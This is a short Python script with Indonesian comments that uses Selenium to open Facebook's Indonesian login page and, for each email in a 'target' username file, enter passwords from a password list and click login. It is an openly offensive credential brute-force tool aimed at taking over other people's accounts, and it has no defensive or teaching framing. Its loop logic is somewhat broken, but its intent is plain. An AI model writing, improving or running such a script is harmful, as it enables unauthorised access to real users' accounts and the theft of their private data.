from selenium import webdriver
from selenium.webdriver.common.by import By 
PATH = "/usr/bin/chromedriver"      ###mengeksekusi chromedriver
driver = webdriver.Chrome(PATH)     ###mengeksekusi driver chrome

user_list = open ('usernamelist.txt' , 'r') ###ini bagian email target 
pass_list = open ('password.txt' ,'r')  ### ini daftar password  target

for a in user_list:
	driver.get ("https://id-id.facebook.com/") ###link web tujuan 
	for b in pass_list:
		e =driver.find_element(By.NAME, "email")
		e.send_keys (a.split())
		passw =driver.find_element(By.NAME, "pass")
		passw.send_keys (b.split())
		e =driver.find_element (By.NAME, "login")
		e.click()
		driver.refresh()
